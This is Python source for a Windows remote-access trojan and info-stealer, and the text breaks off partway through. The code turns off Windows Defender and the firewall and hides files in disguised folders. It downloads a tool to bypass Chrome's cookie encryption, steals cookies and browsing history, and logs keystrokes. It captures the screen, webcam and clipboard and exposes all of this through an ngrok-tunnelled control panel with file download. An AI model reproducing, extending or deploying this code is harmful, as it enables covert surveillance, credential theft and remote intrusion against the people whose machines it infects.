#  _____   ____    _   _  ____ _______    _____ _    _          _____  ______   _ 
# |  __ \ / __ \  | \ | |/ __ \__   __|  / ____| |  | |   /\   |  __ \|  ____| | |
# | |  | | |  | | |  \| | |  | | | |    | (___ | |__| |  /  \  | |__) | |__    | |
# | |  | | |  | | | . ` | |  | | | |     \___ \|  __  | / /\ \ |  _  /|  __|   | |
# | |__| | |__| | | |\  | |__| | | |     ____) | |  | |/ ____ \| | \ \| |____  |_|
# |_____/ \____/  |_| \_|\____/  |_|    |_____/|_|  |_/_/    \_\_|  \_\______| (_)
#                                                                                
# THIS CODE IS PRIVATE AND CONFIDENTIAL
# UNAUTHORIZED SHARING, COPYING, OR DISTRIBUTION IS STRICTLY PROHIBITED.
# 1ypi, vectxr.


auth_token = None
import glob
import io
import json
import logging
import os
from pathlib import Path
import platform
import re
import shutil
import socket
import sqlite3
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request
import webbrowser
import zipfile
from datetime import datetime, timedelta, timezone
from os import getenv
import cv2
import keyboard
import numpy as np
import pyautogui
import pyperclip
import requests
from flask import Flask, Response, render_template_string, request, jsonify, send_file
from PIL import Image, ImageGrab
from werkzeug.serving import make_server

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

key_log = []
log_active = True
current_dir = os.getcwd()
app = Flask(__name__)
ngrok_process = None
ngrok_url = None
auth_token = None
server = None

extracted_cookies = []
extracted_history = []
extraction_complete = False
extractor = None

CONFIG_DIR = os.path.join(os.path.expanduser("~"), ".system32")
os.makedirs(CONFIG_DIR, exist_ok=True)
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")

def watermark():
    return "\n\n***||@1ypi - https://github.com/1ypi||***\n***||@iznard - https://github.com/IzNard||***"

def disable_defender():
    try:
        commands = [
            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
            'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
            'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"',
            'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
            'powershell -Command "Set-MpPreference -DisableScriptScanning $true"',
            'powershell -Command "Set-MpPreference -EnableControlledFolderAccess Disabled"',
            'powershell -Command "Set-MpPreference -EnableNetworkProtection AuditMode"',
            'powershell -Command "Set-MpPreference -SubmitSamplesConsent NeverSend"',
            'powershell -Command "Set-MpPreference -MAPSReporting Disabled"',
            'powershell -Command "Set-MpPreference -HighThreatDefaultAction Allow"',
            'powershell -Command "Set-MpPreference -ModerateThreatDefaultAction Allow"',
            'powershell -Command "Set-MpPreference -LowThreatDefaultAction Allow"',
            'powershell -Command "Set-MpPreference -DisableArchiveScanning $true"',
            'powershell -Command "Set-MpPreference -DisableEmailScanning $true"',
            'powershell -Command "Set-MpPreference -DisableRemovableDriveScanning $true"',
            'powershell -Command "Set-MpPreference -DisableRestorePoint $true"',
            'netsh advfirewall set allprofiles state off',
            f'powershell -Command "Add-MpPreference -ExclusionPath \"{os.path.abspath(sys.argv[0])}\""',
            'powershell -Command "Add-MpPreference -ExclusionProcess \"python.exe\""',
            'powershell -Command "Add-MpPreference -ExclusionProcess \"pythonw.exe\""',
        ]

        for cmd in commands:
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)

        return True
    except Exception as e:
        logger.error(f"Error disabling Defender: {e}")
        return False

def add_exclusion(path):
    try:
        cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \"{path}\""'
        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception as e:
        logger.error(f"Error adding exclusion: {e}")
        return False

def save_config():
    config = {"auth_token": auth_token}
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

def load_config():
    global auth_token
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            config = json.load(f)
            auth_token = config.get("auth_token")

def download_ngrok():
    url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
    
    ngrok_dir = os.path.join(os.path.expanduser("~"), ".system_files")
    os.makedirs(ngrok_dir, exist_ok=True)
    ngrok_path = os.path.join(ngrok_dir, "ngrok.exe")
    
    if os.path.exists(ngrok_path):
        return ngrok_path
    
    response = requests.get(url)
    zip_path = os.path.join(ngrok_dir, "ngrok.zip")
    
    with open(zip_path, 'wb') as f:
        f.write(response.content)
    
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(ngrok_dir)
    
    os.remove(zip_path)
    return ngrok_path

def setup_ngrok_auth(ngrok_path):
    if auth_token:
        subprocess.run([ngrok_path, "config", "add-authtoken", auth_token], 
                      capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)

def start_ngrok(ngrok_path):
    global ngrok_process, ngrok_url
    
    setup_ngrok_auth(ngrok_path)
    
    ngrok_process = subprocess.Popen([ngrok_path, "http", "5000", "--log=stdout"], 
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                   text=True, creationflags=subprocess.CREATE_NO_WINDOW)
    
    timeout = 30
    start_time = time.time()
    ngrok_url = None
    
    while time.time() - start_time < timeout and ngrok_url is None:
        if ngrok_process.poll() is not None:
            break
            
        line = ngrok_process.stdout.readline()
        if not line:
            time.sleep(0.1)
            continue
        
        if "url=" in line and "https://" in line:
            match = re.search(r'url=https://([^\s]+)', line)
            if match:
                ngrok_url = "https://" + match.group(1)
                break
        elif "started tunnel" in line.lower() and "https://" in line:
            match = re.search(r'https://[^\s]+\.ngrok\.io', line)
            if match:
                ngrok_url = match.group(0)
                break
    
    if not ngrok_url:
        time.sleep(3)
        try:
            response = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=10)
            data = response.json()
            if data.get("tunnels"):
                for tunnel in data["tunnels"]:
                    if tunnel.get("public_url", "").startswith("https://"):
                        ngrok_url = tunnel["public_url"]
                        break
        except:
            pass
    
    return ngrok_url

def start_flask():
    global server
    server = make_server('0.0.0.0', 5000, app)
    server.serve_forever()

def stop_services():
    global ngrok_process, ngrok_url, server
    
    if server:
        server.shutdown()
    
    if ngrok_process:
        ngrok_process.terminate()
        ngrok_process = None
    
    ngrok_url = None

class AdvancedBrowserCookieExtractor:
    def __init__(self):
        self.system = platform.system()
        if self.system != "Windows":
            raise Exception("This advanced version is specifically designed for Windows (Chrome v127+ ABE support)")
        self.cookies_data = {}
        self.abe_tool_path = None
        self.temp_tool_dir = None
        self.check_system_compatibility()

    def check_system_compatibility(self):
        system_info = {
            'system': platform.system(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'architecture': platform.architecture(),
            'release': platform.release(),
            'version': platform.version()
        }
        return system_info

    def close_browsers(self):
        browsers = [
            "chrome.exe",
            "msedge.exe", 
            "firefox.exe",
            "brave.exe",
            "opera.exe",
            "vivaldi.exe"
        ]
        closed_browsers = []
        for browser in browsers:
            try:
                result = subprocess.run(
                    ["tasklist", "/FI", f"IMAGENAME eq {browser}"],
                    capture_output=True, text=True, shell=True
                )
                if browser in result.stdout:
                    subprocess.run(["taskkill", "/F", "/IM", browser], 
                                 capture_output=True, shell=True)
                    closed_browsers.append(browser)
                    time.sleep(1)
            except Exception as e:
                print(f"⚠️  Warning: Could not close {browser}: {e}")
        if closed_browsers:
            time.sleep(3)
        return closed_browsers

    def check_and_download_abe_tool(self):
        temp_dir = tempfile.mkdtemp(prefix="abe_tool_")
        tool_exe = os.path.join(temp_dir, "chrome_inject.exe")
        try:
            release_url = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.15.0/chrome-injector-v0.15.0.zip"
            zip_path = os.path.join(temp_dir, "chrome-injector-v0.15.0.zip")
            urllib.request.urlretrieve(release_url, zip_path)
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                arch = platform.machine().lower()
                if 'arm' in arch or 'aarch64' in arch or 'arm64' in arch:
                    target_exe = "chromelevator_arm64.exe"
                else:
                    target_exe = "chromelevator_x64.exe" 
                found = False
                for member in zip_ref.namelist():
                    if member == target_exe:
                        zip_ref.extract(member, temp_dir)
                        extracted_path = os.path.join(temp_dir, member)
                        if os.path.exists(extracted_path):
                            os.rename(extracted_path, tool_exe)
                            found = True
                        break
                if not found:
                    fallback = "chromelevator_x64.exe"
                    for member in zip_ref.namelist():
                        if member == fallback:
                            zip_ref.extract(member, temp_dir)
                            extracted_path = os.path.join(temp_dir, member)
                            if os.path.exists(extracted_path):
                                os.rename(extracted_path, tool_exe)
                                found = True
                            break
            os.remove(zip_path)
            if os.path.exists(tool_exe):
                self.abe_tool_path = tool_exe
                self.temp_tool_dir = temp_dir  
                return True
            else:
                return False
        except Exception as e:
            try:
                shutil.rmtree(temp_dir)
            except:
                pass
            return False

    def extract_abe_cookies_advanced(self, browser="chrome"):
        if not self.abe_tool_path:
            if not self.check_and_download_abe_tool():
                return []
        output_dir = tempfile.mkdtemp(prefix="abe_output_")
        try:
            cmd = [self.abe_tool_path, "--output-path", output_dir, browser.lower()]
            result = subprocess.run(cmd, capture_output=True, text=True, cwd=os.path.dirname(self.abe_tool_path))
            if result.returncode == 0:
                cookies = self.parse_abe_output(output_dir, browser)
                try:
                    shutil.rmtree(output_dir)
                except:
                    pass
                return cookies
            else:
                try:
                    shutil.rmtree(output_dir)
                except:
                    pass
                return []
        except Exception as e:
            try:
                shutil.rmtree(output_dir)
            except:
                pass
            return []

    def parse_abe_output(self, output_dir, browser):
        cookies = []
        browser_dir = os.path.join(output_dir, browser.title())
        if not os.path.exists(browser_dir):
            return []
        for profile_name in os.listdir(browser_dir):
            profile_path = os.path.join(browser_dir, profile_name)
            if not os.path.isdir(profile_path):
                continue
            cookies_file = os.path.join(profile_path, "cookies.json")
            if os.path.exists(cookies_file):
                try:
                    with open(cookies_file, 'r', encoding='utf-8') as f:
                        profile_cookies = json.load(f)
                    for cookie in profile_cookies:
                        cookie['browser'] = browser.title()
                        cookie['profile'] = profile_name
                        if 'host' in cookie:
                            cookie['host'] = cookie['host']
                        cookies.append(cookie)
                except Exception as e:
                    pass
        return cookies

    def get_firefox_path(self):
        profiles_path = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
        if os.path.exists(profiles_path):
            for profile in os.listdir(profiles_path):
                if 'default' in profile.lower():
                    return os.path.join(profiles_path, profile, 'cookies.sqlite')
        return None

    def extract_firefox_cookies(self):
        db_path = self.get_firefox_path()
        if not db_path or not os.path.exists(db_path):
            return []
        temp_db = tempfile.mktemp(suffix='.sqlite')
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT host, name, value, path, expiry, isSecure, isHttpOnly, creationTime
                FROM moz_cookies
            """)
            cookies = []
            for row in cursor.fetchall():
                host, name, value, path, expiry, is_secure, is_httponly, creation_time = row
                expires = None
                created = None
                if expiry:
                    try:
                        expires = datetime.fromtimestamp(expiry, tz=timezone.utc)
                    except:
                        expires = None
                if creation_time:
                    try:
                        created = datetime.fromtimestamp(creation_time / 1000000, tz=timezone.utc)
                    except:
                        created = None
                cookies.append({
                    'browser': 'Firefox',
                    'host': host,
                    'name': name,
                    'value': value,
                    'path': path,
                    'expires': expires.isoformat() if expires else None,
                    'secure': bool(is_secure),
                    'httponly': bool(is_httponly),
                    'created': created.isoformat() if created else None
                })
            conn.close()
            return cookies
        except Exception as e:
            return []
        finally:
            if os.path.exists(temp_db):
                os.remove(temp_db)

    def extract_all_cookies(self, close_browsers=True):
        all_cookies = []
        if close_browsers:
            self.close_browsers()
        chrome_cookies = self.extract_abe_cookies_advanced("chrome")
        all_cookies.extend(chrome_cookies)
        edge_cookies = self.extract_abe_cookies_advanced("edge")
        all_cookies.extend(edge_cookies)
        firefox_cookies = self.extract_firefox_cookies()
        all_cookies.extend(firefox_cookies)
        return all_cookies

    def save_to_json(self, cookies, filename="browser_cookies_decrypted.json"):
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(cookies, f, indent=2, ensure_ascii=False)
        return filename

    def get_cookies_summary(self, cookies):
        if not cookies:
            return "❌ No cookies found"
        browsers = {}
        domains = {}
        decrypted_count = 0
        for cookie in cookies:
            browser = cookie.get('browser', 'Unknown')
            browsers[browser] = browsers.get(browser, 0) + 1
            host = cookie.get('host', 'Unknown')
            domains[host] = domains.get(host, 0) + 1
            value = cookie.get('value', '')
            if value and not value.startswith('[ENCRYPTED'):
                decrypted_count += 1
        summary = f"""🍪 **Cookie Extraction Summary:**
Total cookies: {len(cookies)}
Successfully decrypted: {decrypted_count}
Encryption bypass rate: {(decrypted_count/len(cookies)*100):.1f}%

📊 By browser:
{chr(10).join(f"  {browser}: {count}" for browser, count in browsers.items())}

🌐 Top 10 domains:
{chr(10).join(f"  {domain}: {count}" for domain, count in sorted(domains.items(), key=lambda x: x[1], reverse=True)[:10])}"""
        return summary

    def cleanup(self):
        if hasattr(self, 'temp_tool_dir') and self.temp_tool_dir and os.path.exists(self.temp_tool_dir):
            try:
                shutil.rmtree(self.temp_tool_dir)
            except Exception as e:
                pass

    def __del__(self):
        self.cleanup()

def extract_browser_history():
    """Extraer historial de navegación automáticamente usando el código original"""
    global extracted_history
    
    browsers = {
        "chrome": os.path.join(getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        "edge": os.path.join(getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
        "brave": os.path.join(getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
        "firefox": os.path.join(getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
    }
    
    all_history = []
    
    for browser_name, browser_path in browsers.items():
        if not os.path.exists(browser_path):
            continue
            
        try:
            if browser_name in ["chrome", "edge", "brave"]:
                # Buscar archivos de historial
                for root, dirs, files in os.walk(browser_path):
                    if "History" in files and "Extensions" not in root:
                        history_file = os.path.join(root, "History")
                        try:
                            temp_db = os.path.join(getenv("TEMP"), "temp_history.db")
                            shutil.copy2(history_file, temp_db)
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute("SELECT urls.url, urls.title, visits.visit_time FROM urls JOIN visits ON urls.id = visits.url ORDER BY visits.visit_time DESC LIMIT 200")
                            
                            for url, title, visit_time in cursor.fetchall():
                                timestamp = datetime(1601, 1, 1) + timedelta(microseconds=visit_time)
                                all_history.append({
                                    'browser': browser_name,
                                    'url': url,
                                    'title': title if title else '[No Title]',
                                    'time': timestamp.strftime('%Y-%m-%d %H:%M:%S')
                                })
                            conn.close()
                            os.remove(temp_db)
                        except Exception as e:
                            continue
                            
            elif browser_name == "firefox":
                # Historial de Firefox
                history_files = glob.glob(os.path.join(browser_path, "**", "places.sqlite"), recursive=True)
                for history_file in history_files:
                    try:
                        temp_db = os.path.join(getenv("TEMP"), "temp_places.sqlite")
                        shutil.copy2(history_file, temp_db)
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("""
                            SELECT moz_places.url, moz_places.title, moz_historyvisits.visit_date 
                            FROM moz_places 
                            JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id 
                            ORDER BY moz_historyvisits.visit_date DESC 
                            LIMIT 200
                        """)
                        
                        for url, title, visit_time in cursor.fetchall():
                            timestamp = datetime(1970, 1, 1) + timedelta(microseconds=visit_time)
                            all_history.append({
                                'browser': 'firefox',
                                'url': url,
                                'title': title if title else '[No Title]',
                                'time': timestamp.strftime('%Y-%m-%d %H:%M:%S')
                            })
                        conn.close()
                        os.remove(temp_db)
                    except:
                        pass
                        
        except Exception as e:
            logger.error(f"Error extracting {browser_name} history: {e}")
    
    extracted_history = all_history
    return all_history

def extract_browser_cookies_advanced():
    """Extraer cookies usando el AdvancedBrowserCookieExtractor original"""
    global extracted_cookies, extractor
    
    try:
        if not extractor:
            extractor = AdvancedBrowserCookieExtractor()
        
        all_cookies = extractor.extract_all_cookies(close_browsers=True)
        extracted_cookies = all_cookies
        return all_cookies
    except Exception as e:
        logger.error(f"Error in advanced cookie extraction: {e}")
        return []

def auto_extract_data():
    """Función para extraer datos automáticamente al inicio"""
    global extraction_complete
    
    print("🔍 Extrayendo datos automáticamente...")
    
    # Extraer historial
    history_thread = threading.Thread(target=extract_browser_history, daemon=True)
    history_thread.start()
    
    # Extraer cookies con el método avanzado
    cookies_thread = threading.Thread(target=extract_browser_cookies_advanced, daemon=True)
    cookies_thread.start()
    
    # Esperar a que terminen
    history_thread.join(timeout=60)
    cookies_thread.join(timeout=60)
    
    extraction_complete = True
    print("✅ Extracción automática completada")
    print(f"📊 Historial extraído: {len(extracted_history)} entradas")
    print(f"🍪 Cookies extraídas: {len(extracted_cookies)} cookies")

HTML_INTERFACE = """
<!DOCTYPE html>
<html>
<head>
    <title>System Control Panel</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #fff;
            min-height: 100vh;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 30px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
        }
        .header h1 {
            color: #4CAF50;
            margin: 0;
            font-size: 2.5em;
            text-shadow: 0 2px 10px rgba(76, 175, 80, 0.3);
        }
        .status-bar {
            display: flex;
            justify-content: space-between;
            background: rgba(0, 0, 0, 0.3);
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .status-item {
            text-align: center;
            flex: 1;
            margin: 5px;
            min-width: 120px;
        }
        .status-value {
            font-weight: bold;
            color: #4CAF50;
            font-size: 1.1em;
        }
        .control-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .control-card {
            background: rgba(255, 255, 255, 0.08);
            border-radius: 10px;
            padding: 20px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: all 0.3s ease;
        }
        .control-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
            border-color: rgba(76, 175, 80, 0.3);
        }
        .control-card h3 {
            color: #4CAF50;
            margin-top: 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            padding-bottom: 10px;
        }
        .btn {
            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
            color: white;
            border: none;
            padding: 12px 20px;
            margin: 5px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s ease;
            width: calc(100% - 10px);
        }
        .btn:hover {
            background: linear-gradient(135deg, #45a049 0%, #4CAF50 100%);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.4);
        }
        .btn-download {
            background: linear-gradient(135deg, #2196F3 0%, #1976D2 100%);
        }
        .btn-download:hover {
            background: linear-gradient(135deg, #1976D2 0%, #2196F3 100%);
            box-shadow: 0 5px 15px rgba(33, 150, 243, 0.4);
        }
        .input-group {
            margin: 10px 0;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
            color: #ccc;
        }
        .input-group input, .input-group select {
            width: 100%;
            padding: 10px;
            border-radius: 6px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            background: rgba(0, 0, 0, 0.3);
            color: white;
            font-size: 14px;
        }
        .result-area {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
            max-height: 400px;
            overflow-y: auto;
        }
        .result-area pre {
            white-space: pre-wrap;
            word-wrap: break-word;
            color: #4CAF50;
            margin: 0;
        }
        .data-summary {
            background: rgba(76, 175, 80, 0.1);
            border: 1px solid rgba(76, 175, 80, 0.3);
            border-radius: 10px;
            padding: 15px;
            margin: 10px 0;
        }
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            background: #4CAF50;
            color: white;
            border-radius: 5px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            z-index: 1000;
            transform: translateX(400px);
            transition: transform 0.3s ease;
        }
        .notification.show {
            transform: translateX(0);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🖥️ System Control Panel</h1>
            <p>Keylogger activo | Extracción avanzada de datos</p>
        </div>

        <div class="status-bar">
            <div class="status-item">
                <div>Hostname</div>
                <div class="status-value" id="hostname">Loading...</div>
            </div>
            <div class="status-item">
                <div>IP Address</div>
                <div class="status-value" id="ip">Loading...</div>
            </div>
            <div class="status-item">
                <div>User</div>
                <div class="status-value" id="user">Loading...</div>
            </div>
            <div class="status-item">
                <div>Keylogger</div>
                <div class="status-value" id="keylogger-status">ACTIVE</div>
            </div>
            <div class="status-item">
                <div>Data Extraction</div>
                <div class="status-value" id="extraction-status">COMPLETE</div>
            </div>
        </div>

        <!-- Botones de descarga siempre visibles -->
        <div class="control-grid">
            <div class="control-card">
                <h3>📥 Descargar Datos Extraídos</h3>
                <button class="btn btn-download" onclick="downloadCookies()">🍪 Descargar Cookies (ABE)</button>
                <button class="btn btn-download" onclick="downloadHistory()">📊 Descargar Historial</button>
                <button class="btn btn-download" onclick="downloadKeylog()">⌨️ Descargar Keylog</button>
                <div class="data-summary">
                    <strong>Resumen de datos:</strong><br>
                    <span id="cookies-count">Cookies: 0</span><br>
                    <span id="history-count">Historial: 0</span><br>
                    <span id="keylog-count">Keylog: 0 teclas</span>
                </div>
            </div>

            <div class="control-card">
                <h3>🔧 Sistema</h3>
                <button class="btn" onclick="captureScreen()">📸 Capturar Pantalla</button>
                <button class="btn" onclick="captureWebcam()">📷 Capturar Webcam</button>
                <button class="btn" onclick="getClipboard()">📋 Obtener Clipboard</button>
            </div>

            <div class="control-card">
                <h3>📁 Administrador de Archivos</h3>
                <div class="input-group">
                    <input type="text" id="file-path" placeholder="Directorio actual..." readonly>
                </div>
                <button class="btn" onclick="listFiles()">📋 Listar Archivos</button>
                <button class="btn" onclick="goUp()">📁 Subir Directorio</button>
                <div class="input-group">
                    <input type="text" id="new-path" placeholder="Nueva ruta...">
                    <button class="btn" onclick="changeDirectory()">📂 Cambiar Directorio</button>
                </div>
                <div class="input-group">
                    <input type="text" id="file-to-download" placeholder="Archivo a descargar...">
                    <button class="btn" onclick="downloadFile()">📥 Descargar Archivo</button>
                </div>
            </div>
        </div>

        <div class="control-card">
            <h3>📊 Resultados</h3>
            <div class="result-area">
                <pre id="command-result">Los resultados aparecerán aquí...</pre>
            </div>
        </div>
    </div>

    <div id="notification" class="notification"></div>

    <script>
        function showNotification(message, type = 'success') {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.className = `notification show ${type}`;
            setTimeout(() => {
                notification.classList.remove('show');
            }, 3000);
        }

        async function captureScreen() {
            try {
                const response = await fetch('/api/screen');
                if (response.ok) {
                    const blob = await response.blob();
                    const url = URL.createObjectURL(blob);
                    const img = document.createElement('img');
                    img.src = url;
                    img.style.maxWidth = '100%';
                    
                    document.getElementById('command-result').innerHTML = '';
                    document.getElementById('command-result').appendChild(img);
                    showNotification('Captura de pantalla realizada!');
                } else {
                    const result = await response.json();
                    document.getElementById('command-result').textContent = result.error;
                }
            } catch (error) {
                document.getElementById('command-result').textContent = `Error: ${error}`;
            }
        }

        async function captureWebcam() {
            try {
                const response = await fetch('/api/webcam');
                const result = await response.json();
                document.getElementById('command-result').textContent = result.result || result.error;
                showNotification(result.result ? 'Foto de webcam capturada!' : 'Error en webcam');
            } catch (error) {
                document.getElementById('command-result').textContent = `Error: ${error}`;
            }
        }

        async function getClipboard() {
            try {
                const response = await fetch('/api/clipboard');
                const result = await response.json();
                document.getElementById('command-result').textContent = result.result || result.error;
            } catch (error) {
                document.getElementById('command-result').textContent = `Error: ${error}`;
            }
        }

        async function downloadCookies() {
            try {
                const response = await fetch('/api/download_cookies');
                if (response.ok) {
                    const blob = await response.blob();
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'cookies_advanced.json';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    showNotification('Cookies (ABE) descargadas!');
                }
            } catch (error) {
                document.getElementById('command-result').textContent = `Error: ${error}`;
            }
        }

        async function downloadHistory() {
            try {
                const response = await fetch('/api/download_history');
                if (response.ok) {
                    const blob = await response.blob();
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'browser_history.json';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    showNotification('Historial descargado!');
                }
            } catch (error) {
                document.getElementById('command-result').textContent = `Error: ${error}`;
            }
        }

        async function downloadKeylog() {
            try {
                const response = await fetch('/api/download_keylog');
                if (response.ok) {
                    const blob = await response.blob();
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'keylog.txt';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    showNotification('Keylog descargado!');
                }
            } catch (error) {
                document.getElementById('command-result').textContent = `Error: ${error}`;
            }
        }

        async function listFiles() {
            try {
                const response = await fetch('/api/list_files');
                const result = await response.json();
                document.getElementById('command-result').textContent = result.files || result.error;
                document.getElementById('file-path').value = result.current_dir || '';
            } catch (error) {
                document.getElementById('command-result').textContent = `Error: ${error}`;
            }
        }

        async function changeDirectory() {
            const path = document.getElementById('new-path').value;
            if (path) {
                try {
                    const response = await fetch('/api/change_dir', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ path })
                    });
                    const result = await response.json();
                    document.getElementById('file-path').value = result.current_dir || '';
                    document.getElementById('new-path').value = '';
                    listFiles();
                } catch (error) {
                    document.getElementById('command-result').textContent = `Error: ${error}`;
                }
            }
        }

        async function goUp() {
            try {
                const response = await fetch('/api/go_up');
                const result = await response.json();
                document.getElementById('file-path').value = result.current_dir || '';
                listFiles();
            } catch (error) {
                document.getElementById('command-result').textContent = `Error: ${error}`;
            }
        }

        async function downloadFile() {
            const file = document.getElementById('file-to-download').value;
            if (file) {
                window.open(`/api/download_file?file=${encodeURIComponent(file)}`, '_blank');
                document.getElementById('file-to-download').value = '';
            }
        }

        async function updateStatus() {
            try {
                const response = await fetch('/api/status');
                const status = await response.json();
                
                document.getElementById('hostname').textContent = status.hostname;
                document.getElementById('ip').textContent = status.ip;
                document.getElementById('user').textContent = status.user;
                document.getElementById('cookies-count').textContent = `Cookies: ${status.cookies_count}`;
                document.getElementById('history-count').textContent = `Historial: ${status.history_count}`;
                document.getElementById('keylog-count').textContent = `Keylog: ${status.keylog_count} teclas`;
                document.getElementById('extraction-status').textContent = status.extraction_complete ? 'COMPLETE' : 'IN PROGRESS';
                
            } catch (error) {
                console.error('Error updating status:', error);
            }
        }
        
        document.addEventListener('DOMContentLoaded', function() {
            updateStatus();
            setInterval(updateStatus, 3000);
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return HTML_INTERFACE

@app.route('/api/screen', methods=['GET'])
def api_screen():
    try:
        screenshot = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format="PNG")
        img_bytes.seek(0)
        
        temp_file = os.path.join(os.getenv('TEMP'), 'screenshot.png')
        screenshot.save(temp_file, "PNG")
        
        return send_file(temp_file, mimetype='image/png')
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/webcam', methods=['GET'])
def api_webcam():
    try:
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            return jsonify({'success': False, 'error': 'No se pudo acceder a la webcam'})
        
        ret, frame = cam.read()
        cam.release()
        
        if ret:
            # Guardar la imagen temporalmente
            temp_file = os.path.join(os.getenv('TEMP'), 'webcam_capture.jpg')
            cv2.imwrite(temp_file, frame)
            return jsonify({'success': True, 'result': 'Foto de webcam capturada correctamente'})
        else:
            return jsonify({'success': False, 'error': 'No se pudo capturar la imagen de la webcam'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/clipboard', methods=['GET'])
def api_clipboard():
    try:
        content = pyperclip.paste()
        return jsonify({
            'success': True, 
            'result': f'Clipboard: {content}' if content else 'Clipboard vacío'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/download_cookies', methods=['GET'])
def api_download_cookies():
    global extracted_cookies
    try:
        if not extracted_cookies:
            extract_browser_cookies_advanced()
        
        cookies_json = json.dumps(extracted_cookies, indent=2, ensure_ascii=False)
        return Response(
            cookies_json,
            mimetype='application/json',
            headers={'Content-Disposition': 'attachment;filename=cookies_advanced.json'}
        )
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/download_history', methods=['GET'])
def api_download_history():
    global extracted_history
    try:
        if not extracted_history:
            extract_browser_history()
        
        history_json = json.dumps(extracted_history, indent=2, ensure_ascii=False)
        return Response(
            history_json,
            mimetype='application/json',
            headers={'Content-Disposition': 'attachment;filename=browser_history.json'}
        )
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/download_keylog', methods=['GET'])
def api_download_keylog():
    global key_log
    try:
        keylog_text = " ".join(key_log) if key_log else "No hay datos de keylog"
        return Response(
            keylog_text,
            mimetype='text/plain',
            headers={'Content-Disposition': 'attachment;filename=keylog.txt'}
        )
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/status', methods=['GET'])
def api_status():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
